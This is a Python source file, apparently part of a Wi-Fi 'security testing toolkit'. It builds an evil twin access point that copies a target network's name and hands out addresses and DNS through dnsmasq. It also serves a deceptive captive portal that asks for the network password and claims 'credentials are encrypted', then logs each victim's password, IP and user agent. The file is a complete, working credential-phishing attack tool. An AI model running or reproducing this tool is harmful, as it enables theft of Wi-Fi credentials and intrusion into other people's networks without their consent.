"""
WiFi Security Testing Toolkit — Evil Twin / Rogue Access Point
Creates a fake AP mimicking a target, captures credentials via captive portal.
"""

from __future__ import annotations

import subprocess
import time
import signal
import sys
import threading
import http.server
import socketserver
import os
import re
from pathlib import Path
from dataclasses import dataclass
from urllib.parse import urlparse, parse_qs

from monitor import InterfaceManager


CAPTIVE_PORTAL_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Wi-Fi Login</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
}
.container {
    background: rgba(255,255,255,0.95);
    border-radius: 16px;
    padding: 40px;
    width: 380px;
    max-width: 95vw;
    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
    text-align: center;
}
.lock-icon {
    font-size: 48px;
    margin-bottom: 8px;
}
h1 { font-size: 20px; color: #333; margin-bottom: 4px; }
.subtitle { font-size: 13px; color: #888; margin-bottom: 24px; }
.form-group { margin-bottom: 16px; text-align: left; }
label { display: block; font-size: 12px; color: #555; margin-bottom: 4px;
        font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
input[type="password"] {
    width: 100%; padding: 12px; border: 2px solid #e0e0e0;
    border-radius: 8px; font-size: 15px; transition: border 0.2s;
}
input[type="password"]:focus {
    outline: none; border-color: #667eea;
}
button {
    width: 100%; padding: 12px; background: linear-gradient(135deg, #667eea, #764ba2);
    color: white; border: none; border-radius: 8px; font-size: 16px;
    font-weight: 600; cursor: pointer; margin-top: 8px; transition: transform 0.1s;
}
button:hover { transform: translateY(-1px); }
button:active { transform: translateY(0); }
.error { color: #e74c3c; font-size: 13px; margin-top: 8px; display: none; }
.footer { font-size: 11px; color: #aaa; margin-top: 20px; }
</style>
</head>
<body>
<div class="container">
    <div class="lock-icon">🔒</div>
    <h1>SSID_PLACEHOLDER</h1>
    <p class="subtitle">Authentication required to connect</p>
    <form id="loginForm">
        <div class="form-group">
            <label>Wi-Fi Password</label>
            <input type="password" id="pass" placeholder="Enter network password"
                   autocomplete="off" autofocus required minlength="8">
        </div>
        <div class="error" id="error">Incorrect password. Please try again.</div>
        <button type="submit">Connect</button>
    </form>
    <p class="footer">Secured network — credentials are encrypted</p>
</div>
<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    var pass = document.getElementById('pass').value;
    fetch('/login', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'password=' + encodeURIComponent(pass)
    }).then(function(r) { return r.json(); })
      .then(function(d) {
        if (d.success) {
            document.querySelector('.container').innerHTML =
                '<div class="lock-icon">✅</div>' +
                '<h1>Connected!</h1>' +
                '<p class="subtitle">You are now online.</p>' +
                '<p class="footer">Redirecting...</p>';
            setTimeout(function() {
                window.location.href = d.redirect || 'https://google.com';
            }, 2000);
        } else {
            document.getElementById('error').style.display = 'block';
            document.getElementById('pass').value = '';
            document.getElementById('pass').focus();
        }
    });
});
</script>
</body>
</html>"""


@dataclass
class CapturedCredential:
    ssid: str
    password: str
    ip: str
    user_agent: str
    timestamp: float


class CaptivePortalHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler for the captive portal that captures Wi-Fi passwords."""

    captured: list[CapturedCredential] = []
    redirect_url: str = "https://google.com"
    ssid: str = "WiFi"

    def log_message(self, format, *args):
        pass  # Suppress HTTP logs

    def _get_ip(self) -> str:
        return self.client_address[0]

    def do_GET(self):
        parsed = urlparse(self.path)

        # Android/iOS/Windows captive portal detection
        if parsed.path in ("/generate_204", "/hotspot-detect.html", "/ncsi.txt",
                           "/connecttest.txt", "/redirect", "/fwlink/",
                           "/library/test/success.html", "/success.txt"):
            self.send_response(302)
            self.send_header("Location", "http://captive.apple.com/hotspot-detect.html")
            self.end_headers()
            return

        # Serve the captive portal page
        html = CAPTIVE_PORTAL_HTML.replace("SSID_PLACEHOLDER", self.ssid)
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(html.encode())

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8")

        if self.path == "/login":
            params = parse_qs(body)
            password = params.get("password", [""])[0]
            ip = self._get_ip()
            ua = self.headers.get("User-Agent", "Unknown")

            credential = CapturedCredential(
                ssid=self.ssid,
                password=password,
                ip=ip,
                user_agent=ua,
                timestamp=time.time(),
            )
            self.captured.append(credential)

            print(f"\n[+] CAPTURED: {self.ssid} | Password: {password}")
            print(f"    IP: {ip} | UA: {ua[:60]}...")

            response = '{"success": true, "redirect": "' + self.redirect_url + '"}'
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(response.encode())
        else:
            self.send_response(404)
            self.end_headers()


class EvilTwin:
    """
    Creates a rogue AP that mimics a target network.
    Captures WPA passwords via a captive portal.
    """

    def __init__(self, iface: str, ssid: str, channel: int,
                 internet_iface: str | None = None):
        self.iface = iface
        self.ssid = ssid
        self.channel = channel
        self.internet_iface = internet_iface
        self._ap_process = None
        self._http_server = None
        self._running = False

    def _configure_ap(self) -> None:
        """Set up the rogue access point with hostapd."""
        hostapd_conf = Path("/tmp/evil_twin_hostapd.conf")
        conf = f"""interface={self.iface}
driver=nl80211
ssid={self.ssid}
hw_mode={"g" if self.channel <= 14 else "a"}
channel={self.channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
"""
        hostapd_conf.write_text(conf)
        print(f"[*] hostapd config written to {hostapd_conf}")

        # Configure IP
        subprocess.run(["ifconfig", self.iface, "up"], capture_output=True)
        subprocess.run(["ip", "addr", "flush", "dev", self.iface],
                       capture_output=True)
        subprocess.run(["ip", "addr", "add", "10.0.0.1/24", "dev", self.iface],
                       capture_output=True)

    def _setup_dhcp(self) -> None:
        """Configure dnsmasq for DHCP and DNS."""
        dnsmasq_conf = Path("/tmp/evil_twin_dnsmasq.conf")
        conf = f"""interface={self.iface}
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
no-resolv
log-queries
log-dhcp
"""
        dnsmasq_conf.write_text(conf)
        print(f"[*] dnsmasq config written to {dnsmasq_conf}")

        # Kill existing dnsmasq
        subprocess.run(["pkill", "dnsmasq"], capture_output=True)
        time.sleep(0.5)

        # Start dnsmasq
        subprocess.Popen(
            ["dnsmasq", "-C", str(dnsmasq_conf), "--no-daemon"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

    def _setup_iptables(self) -> None:
        """Set up NAT and forwarding if internet sharing is enabled."""
        if not self.internet_iface:
            return

        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                       capture_output=True)
        subprocess.run(
            ["iptables", "-t", "nat", "-A", "POSTROUTING",
             "-o", self.internet_iface, "-j", "MASQUERADE"],
            capture_output=True
        )
        subprocess.run(
            ["iptables", "-A", "FORWARD",
             "-i", self.iface, "-o", self.internet_iface, "-j", "ACCEPT"],
            capture_output=True
        )
        subprocess.run(
            ["iptables", "-A", "FORWARD",
             "-i", self.internet_iface, "-o", self.iface,
             "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
            capture_output=True
        )

    def _start_http_server(self, port: int = 80) -> None:
        """Start the captive portal HTTP server."""
        CaptivePortalHandler.ssid = self.ssid

        self._http_server = socketserver.ThreadingTCPServer(
            ("0.0.0.0", port), CaptivePortalHandler
        )
        server_thread = threading.Thread(target=self._http_server.serve_forever,
                                         daemon=True)
        server_thread.start()
        print(f"[*] Captive portal running on port {port}")

    def start(self, deauth_original: bool = True) -> None:
        """Start the evil twin attack."""
        InterfaceManager.require_root()

        print(f"\n{'='*60}")
        print(f"  EVIL TWIN ATTACK")
        print(f"{'='*60}")
        print(f"  Target SSID:  {self.ssid}")
        print(f"  Channel:      {self.channel}")
        print(f"  Interface:    {self.iface}")
        print(f"  Internet:     {self.internet_iface or 'None (no internet)'}")
        print(f"{'='*60}\n")

        # Deauth original AP clients first if requested
        if deauth_original:
            print("[*] Deauthing clients from original AP first...")
            # (This requires knowing the original BSSID — handled by nexus.py)

        self._configure_ap()
        self._setup_dhcp()
        self._setup_iptables()

        # Start hostapd
        try:
            self._ap_process = subprocess.Popen(
                ["hostapd", "/tmp/evil_twin_hostapd.conf"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(2)
            if self._ap_process.poll() is not None:
                print("[!] hostapd failed to start. Check interface/driver.")
                print("[!] Try: hostapd /tmp/evil_twin_hostapd.conf")
                return
            print("[+] Access point is broadcasting")
        except FileNotFoundError:
            print("[!] hostapd not found. Install: apt install hostapd")
            return

        self._start_http_server()

        self._running = True
        print("[*] Evil twin running. Press Ctrl+C to stop.\n")

        signal.signal(signal.SIGINT, self._handle_signal)

        try:
            while self._running:
                time.sleep(1)
        except KeyboardInterrupt:
            self._running = False

        self.cleanup()

    def cleanup(self) -> None:
        """Teardown the evil twin and restore state."""
        print("\n[*] Cleaning up...")

        if self._ap_process:
            self._ap_process.terminate()
            self._ap_process.wait()

        if self._http_server:
            self._http_server.shutdown()

        subprocess.run(["pkill", "dnsmasq"], capture_output=True)
        subprocess.run(["pkill", "hostapd"], capture_output=True)

        # Flush iptables NAT rules
        if self.internet_iface:
            subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
            subprocess.run(["iptables", "-F"], capture_output=True)

        print("[*] Cleanup complete")

        # Display captured credentials
        if CaptivePortalHandler.captured:
            print(f"\n{'='*50}")
            print(f"  CAPTURED CREDENTIALS: {len(CaptivePortalHandler.captured)}")
            print(f"{'='*50}")
            for cred in CaptivePortalHandler.captured:
                print(f"  [{cred.ssid}] {cred.password}")
                print(f"    IP: {cred.ip} | Time: {time.ctime(cred.timestamp)}")

    def _handle_signal(self, signum, frame):
        self._running = False


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Evil Twin / Rogue AP")
    parser.add_argument("iface", help="Wireless interface for the rogue AP")
    parser.add_argument("ssid", help="SSID to broadcast")
    parser.add_argument("-c", "--channel", type=int, required=True,
                        help="Channel for the rogue AP")
    parser.add_argument("-i", "--internet", type=str, default=None,
                        help="Internet-connected interface (for passthrough)")
    parser.add_argument("--no-deauth", action="store_true",
                        help="Skip deauthing original AP clients")
    args = parser.parse_args()

    evil = EvilTwin(
        iface=args.iface,
        ssid=args.ssid,
        channel=args.channel,
        internet_iface=args.internet,
    )
    evil.start(deauth_original=not args.no_deauth)
